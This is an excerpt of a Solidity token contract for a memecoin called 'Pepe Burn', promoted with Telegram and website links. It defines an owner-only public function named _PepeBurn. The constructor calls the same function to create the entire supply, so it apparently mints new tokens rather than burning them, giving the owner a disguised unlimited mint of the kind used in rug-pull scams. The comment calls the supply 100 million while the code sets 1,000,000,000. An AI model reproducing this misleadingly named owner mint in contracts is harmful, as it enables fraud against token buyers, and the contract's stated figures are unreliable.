//
// $PepeBurn proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+HTdFjzko6fViMDE9
//  📱 Website::https://www.pepeburn.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _PepeBurn(uint256 amount) public onlyOwner {
 _PepeBurn(msg.sender, amount);
    }
    ...
    function _PepeBurn(address account, uint256 amount) internal virtual {
...
contract $PepeBurn is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Pepe Burn", "PEPEBURN") {
    _PepeBurn(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}